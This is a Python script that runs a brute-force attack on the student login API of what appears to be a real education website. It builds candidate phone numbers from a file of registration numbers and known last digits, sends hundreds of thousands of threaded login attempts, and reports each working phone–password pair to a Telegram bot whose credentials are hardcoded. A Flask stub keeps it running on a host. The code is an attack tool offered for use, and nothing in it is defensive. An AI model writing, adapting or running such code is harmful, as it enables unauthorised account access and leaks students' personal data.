import requests
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM")
CHAT_ID = os.environ.get("CHAT_ID", "1634075045")

API_URL = "https://www.eduintern.in/api/auth/login"
FILE_NAME = "students.txt" 
THREADS = 20 

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.eduintern.in",
    "Referer": "https://www.eduintern.in/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
}

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

def check(phone, password):
    try:
        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=8)
        data = r.json() if r.text else {}
        success = "student" in data or "user" in data or ("token" in data and "name" in data)
        return {"status": r.status_code, "success": success, "phone": phone}
    except Exception as e:
        return {"status": "ERROR", "success": False, "phone": phone}

def process_student(index, reg_no, last4):
    print(f"\n{'='*50}", flush=True)
    print(f"[{index}] TARGET: {reg_no} (Ending: {last4})", flush=True)
    print(f"{'='*50}", flush=True)
    
    prefixes = [f"{digit}{i:05d}" for digit in ['6', '7', '8', '9'] for i in range(100000)]
    total = len(prefixes)
    
    found_phone = None
    checked = 0
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(check, prefix + last4, reg_no): prefix for prefix in prefixes}
        
        for future in as_completed(futures):
            checked += 1
            res = future.result()
            
            if res["success"]:
                found_phone = res["phone"]
                print(f"\n✅ MATCH FOUND: {found_phone}\n", flush=True)
                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
                break
            
            # Har 5000 request ke baad ek summary log
            if checked % 5000 == 0:
                print(f"⏳ Progress: {checked} / {total} scanned...", flush=True)

    if not found_phone:
        print(f"❌ NO MATCH for {reg_no}", flush=True)
        send_telegram_msg(f"[{index}] {reg_no}    no match number found")
        
    send_telegram_msg("--------------------------------\nNext target...")

def run_hunter():
    time.sleep(3)
    try:
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            
        print(f"Total {len(lines)} lines mili. Kaam shuru...", flush=True)
        send_telegram_msg(f"🚀 Script start! Total {len(lines)} students.")
        
        for i, line in enumerate(lines, start=1):
            parts = line.split()
            if len(parts) >= 2:
                process_student(i, parts[0], parts[1])
                
        send_telegram_msg("✅ Saare students process ho gaye!")
    except Exception as e:
        print("Error:", e, flush=True)

@app.route('/')
def home():
    return "Hunter Bot is running..."

if __name__ == "__main__":
    threading.Thread(target=run_hunter, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
